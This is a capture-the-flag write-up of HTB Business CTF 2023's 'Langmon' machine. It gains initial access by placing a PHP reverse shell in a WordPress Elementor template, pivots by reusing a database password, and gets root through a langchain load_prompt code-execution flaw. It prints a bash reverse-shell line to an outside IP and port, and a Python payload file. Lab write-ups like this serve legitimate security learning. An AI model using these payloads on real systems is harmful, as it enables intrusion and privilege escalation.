---
layout: post
title:  "HTB Business CTF 2023 - Langmon writeup"
date:   2023-07-17 00:00:00 +0300
categories: HTB_Business_CTF_2023 CTF FullPwn HTB
summary: Writeup for the Langmon challenge from HTB's Business CTF from 2023. This challenge involved exploiting a wordpress exploit and a langmon exploit.
---


Langmon was a challenge at the HTB Business CTF 2023 from the 'FullPwn' category.  
It involved a VM structured like a usual HTB machine with a user flag and a root flag.  
Its difficulty level was 'Very Easy' & it was mostly based on finding simple vulnerabilities and exploiting them.  

### Recon & identifying the service

After spawning the target, I only got an IP address and no specific port so the first step was to run a port scan & see what services are listening.  
There were 2 open ports:
- 22 - a ssh service
- 80 - a web app

The SSH service doesn't show any hint that it could be abused.  
So, I started with the web server.

### Web app

On port 80, I found a web page.

![The main web page]({{site.baseurl}}/assets/img/HTB_Business_CTF_2023/langmon/web_page.png){: .center-image}

After inspecting it, I noticed that it is built using Wordpress. I also found the wp-login page.  

![The login page]({{site.baseurl}}/assets/img/HTB_Business_CTF_2023/langmon/wp_login.png){: .center-image}

Running wpscan on this doesn't return anything interesting, so I continued by manually exploring this app.  

By accessing /wp-json/wp/v2/users, I could see that the only user is 'admin'. This might be useful if for a brute-force attack later (maybe?).  

![Wordpress users]({{site.baseurl}}/assets/img/HTB_Business_CTF_2023/langmon/wp_users.png){: .center-image}

I also found the sitemap for this web application.

![Wordpress users]({{site.baseurl}}/assets/img/HTB_Business_CTF_2023/langmon/sitemap.png){: .center-image}

The most interesting part here is the registration page. I went there and tried to create a new account.  

![Registration]({{site.baseurl}}/assets/img/HTB_Business_CTF_2023/langmon/register.png){: .center-image}

After creating a new account, I was able to access the wordpress dashboard (as a regular user).  
However, I was unable to post anything without the admin reviewing it first.  

It looks like I could also create templates, not just posts.  
However, those also have to be admin-approved.
![Creating templates]({{site.baseurl}}/assets/img/HTB_Business_CTF_2023/langmon/templates_01.png){: .center-image}

While looking at the options available for a regular user when creating templates, I noticed that I can use the Elementor plugin in order to make it easier to create templates and pages.

![Using Elementor plugin]({{site.baseurl}}/assets/img/HTB_Business_CTF_2023/langmon/templates_02.png){: .center-image}

Also, that plugin allows for HTML / PHP blocks to be placed inside the pages or templates.  

![Inserting PHP]({{site.baseurl}}/assets/img/HTB_Business_CTF_2023/langmon/templates_03.png){: .center-image}

So ... what if I put a shell in there

![Preparing the reverse shell]({{site.baseurl}}/assets/img/HTB_Business_CTF_2023/langmon/shell_setup.png){: .center-image}

I pasted the contents of [this](https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/laudanum-0.8/php/php-reverse-shell.php) php reverse shell in there and clicked 'Apply'.  
It looks like my code gets executed after clicking 'Apply'. I could see that the shell was executed by checking on my listener.  

![First shell obtained]({{site.baseurl}}/assets/img/HTB_Business_CTF_2023/langmon/shell.png){: .center-image}

Now I have a shell as www-data.  
First, let's take a look at the wp-config file. It's always a good thing to check after obtaining access to a wordpress server. There might be some useful information in there.  

![Wordpress credentials]({{site.baseurl}}/assets/img/HTB_Business_CTF_2023/langmon/wp_credentials.png){: .center-image}

The database password is in there. It might be useful for connecting to the DB.  
Or, it might be re-used in other places.  

Let's check out what are the users available on this server.

![Users on the server]({{site.baseurl}}/assets/img/HTB_Business_CTF_2023/langmon/users.png){: .center-image}

Only 'developer' has a homedir, so that's probably the user that I want to login as.  
Let's check if the DB password isn't reused as the user's password too.  

![Logging in as developer]({{site.baseurl}}/assets/img/HTB_Business_CTF_2023/langmon/user_login.png){: .center-image}

And it works. I could also get the user flag for this machine: **HTB{4lw4y5_upd473_y0ur_plu61n5}**

![User flag]({{site.baseurl}}/assets/img/HTB_Business_CTF_2023/langmon/user_flag.png){: .center-image}

I had the user's password so I checked if I could use sudo for anything (`sudo -l`).  

![Running sudo]({{site.baseurl}}/assets/img/HTB_Business_CTF_2023/langmon/sudo.png){: .center-image}

The 'developer' user can run /opt/prompt_loader.py as root.  

prompt_loader.py is a python script that imports [langchain](https://python.langchain.com/docs/get_started/introduction.html) and then calls load_prompt on a file specified by the user.  
The load_prompt method is known to be vulnerable and can be used for arbitrary code execution. More details on that can be seen [here](https://github.com/hwchase17/langchain/issues/4849).  

First, I took the PoC from github issue and tried using that as the script's input.
![Running the PoC]({{site.baseurl}}/assets/img/HTB_Business_CTF_2023/langmon/running_poc.png){: .center-image}

It works and it runs as root.  

Now I have to change the payload and use it to get a shell.  
I'm not sure if this script could spawn an interactive shell, so I tried with a reverse shell.  
A bash reverse shell (`bash -i >& /dev/tcp/10.10.14.182/1337 0>&1`) wouldn't work (maybe I forgot to escape something?) so I put it in a file and ran the file instead.

So my final payloads are:

/tmp/shell.sh
{% highlight bash %}
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.182/1337 0>&1
{% endhighlight %}

/tmp/prompt.py
{% highlight python %}
from langchain.output_parsers.list import CommaSeparatedListOutputParser
from langchain.prompts.prompt import PromptTemplate
_DECIDER_TEMPLATE = """Given the below input question and list of potential tables, output a comma separated list of the table names that may be neccessary to answer this question.

Question: {query}

Table Names: {table_names}

Relevant Table Names:"""

import os
os.system('id')
PROMPT = PromptTemplate(
    input_variables=["query", "table_names"],
    template=_DECIDER_TEMPLATE,
    output_parser=CommaSeparatedListOutputParser(),
)
{% endhighlight %}

![Preparing the payload]({{site.baseurl}}/assets/img/HTB_Business_CTF_2023/langmon/payload.png){: .center-image}

And after running this (`sudo /opt/prompt_loader.py /tmp/prompt.py`) I could see a connection on my listener.

![Getting a root shell]({{site.baseurl}}/assets/img/HTB_Business_CTF_2023/langmon/root_shell.png){: .center-image}

And now I had a root shell on this machine.

![Getting the root flag]({{site.baseurl}}/assets/img/HTB_Business_CTF_2023/langmon/root_flag.png){: .center-image}

And I got the root flag for this machine: **HTB{7h3_m4ch1n35_5p34k_w3_h34r}**